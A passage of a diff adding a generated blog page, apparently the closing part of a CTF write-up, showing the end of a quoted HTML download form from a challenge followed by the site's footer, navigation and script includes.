+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;select name=&#34;download&#34; id=&#34;image&#34; onchange=&#34;updateImage()&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;option value=&#34;/assets/images/topsecret1.png&#34;&gt;Image 1&lt;/option&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;option value=&#34;/assets/images/topsecret2.png&#34;&gt;Image 2&lt;/option&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;option value=&#34;/assets/images/topsecret3.png&#34;&gt;Image 3&lt;/option&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;option value=&#34;/assets/images/topsecret4.png&#34;&gt;Image 4&lt;/option&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;/select&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;button type=&#34;submit&#34;&gt;Download&lt;/button&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
+</span></span></span></code></pre></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 0001-01-01</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/1337up-2024-full-writeup/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thesaucese.github.io/1337up-2024-full-writeup/" data-title=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thesaucese.github.io/1337up-2024-full-writeup/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://thesaucese.github.io/1337up-2024-full-writeup/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/chainit/" class="next" rel="next" title="CygenixCTF - Chain it">CygenixCTF - Chain it<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.132.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"></div>
+        </div>
+    </footer>
+    <script defer language="javascript" type="text/javascript"  src="/js/oneko.js"></script></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"data":{"id-1":"TheSaucese","id-2":"TheSaucese"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
